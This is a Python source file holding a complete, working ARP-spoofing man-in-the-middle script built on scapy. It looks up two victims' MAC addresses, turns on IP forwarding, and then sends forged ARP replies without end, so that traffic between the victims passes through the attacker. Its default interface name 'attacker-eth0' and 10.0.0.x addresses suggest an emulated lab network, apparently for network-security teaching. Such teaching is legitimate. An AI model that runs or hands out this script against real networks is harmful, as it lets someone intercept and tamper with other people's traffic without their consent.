import scapy.all as scapy
import sys
import os
import time
import argparse
import netifaces as ni

parser = argparse.ArgumentParser(description="Attacking script to be run in xterm.")
parser.add_argument(
    "-i",
    "--interface",
    type=str,
    help="Interface of the attacker",
    default="attacker-eth0",
)
parser.add_argument(
    "--victim1-ip",
    type=str,
    help="Victim 1's IP address",
    default="10.0.0.1",
)
parser.add_argument(
    "--victim2-ip",
    type=str,
    help="Victim 2's IP address",
    default="10.0.0.2",
)
parser.add_argument(
    "--victim1-mac",
    type=str,
    help="Victim 1's MAC address",
)
parser.add_argument(
    "--victim2-mac",
    type=str,
    help="Victim 2's MAC address",
)


def set_ip_forwarding(value):
    os.system(f"echo {value} > /proc/sys/net/ipv4/ip_forward")


def get_mac_by_IP(IP):
    try:
        scapy.conf.verb = 0
        pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP)
        pkt.show()
        ans, _ = scapy.srp(
            pkt,
            timeout=2,
            # iface=interface,
            inter=0.1,
        )
        for _, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")
    except Exception as e:
        set_ip_forwarding(0)
        print(f"[!] Couldn't Find MAC Address for IP: {IP}. Error: {e}")
        print("[!] Exiting...")
        sys.exit(1)


def mitm():
    global attacker_MAC
    print("[*] Poisoning Targets...")

    # attacker pretending as victim 1 and answering to victim 2
    pkt1 = scapy.Ether(src=attacker_MAC, dst=victim2_MAC) / scapy.ARP(
        op=2,
        hwsrc=attacker_MAC,
        psrc=victim1_IP,
        hwdst=victim2_MAC,
        pdst=victim2_IP,
    )

    # attacker pretending as victim 2 and answering to victim 1
    pkt2 = scapy.Ether(src=attacker_MAC, dst=victim1_MAC) / scapy.ARP(
        op=2,
        hwsrc=attacker_MAC,
        psrc=victim2_IP,
        hwdst=victim1_MAC,
        pdst=victim1_IP,
    )
    pkt1.show()
    pkt2.show()

    packet_count = 0
    while 1:
        scapy.sendp(pkt1)
        scapy.sendp(pkt2)
        print(f"{packet_count} packets sent", end="\r")
        time.sleep(1.5)
        packet_count += 1


if __name__ == "__main__":
    args = parser.parse_args()
    interface = args.interface
    attacker_IP = ni.ifaddresses(interface)[ni.AF_INET][0]["addr"]
    attacker_MAC = ni.ifaddresses(interface)[ni.AF_LINK][0]["addr"]
    victim1_IP = args.victim1_ip
    victim2_IP = args.victim2_ip

    if args.victim1_mac is None:
        print("Victim 1's MAC is not supplied. Fetching it with ARP request...")
        victim1_MAC = get_mac_by_IP(victim1_IP)
    else:
        victim1_MAC = args.victim1_mac

    if args.victim2_mac is None:
        print("Victim 2's MAC is not supplied. Fetching it with ARP request...")
        victim2_MAC = get_mac_by_IP(victim2_IP)
    else:
        victim2_MAC = args.victim2_mac

    print(f"Attacker: (IP={attacker_IP}, MAC={attacker_MAC})")
    print(f"v1: (IP={victim1_IP}, MAC={victim1_MAC})")
    print(f"v2: (IP={victim2_IP}, MAC={victim2_MAC})")

    set_ip_forwarding(1)
    mitm()
